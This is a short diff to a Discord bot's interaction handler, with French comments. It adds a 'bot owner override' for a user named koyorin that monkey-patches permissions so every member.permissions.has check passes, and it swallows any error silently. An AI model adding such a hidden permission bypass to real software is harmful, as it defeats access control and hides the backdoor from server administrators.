@@ -371,6 +371,13 @@ async function handleSpamDetection(message, history, reason, channelCount) {
  * Event: Interactions (commandes slash et boutons)
  */
 client.on('interactionCreate', async interaction => {
+    // ⭐ Bot owner override (koyorin) : monkey-patch des permissions à la racine
+    // pour que toutes les vérifs `member.permissions.has(...)` passent automatiquement.
+    try {
+        const { applyOwnerOverride } = require('./src/utils/bot-owner');
+        applyOwnerOverride(interaction);
+    } catch (_) { /* noop */ }
+
     // Gestion des commandes slash
     if (interaction.isChatInputCommand()) {
         const command = client.commands.get(interaction.commandName);
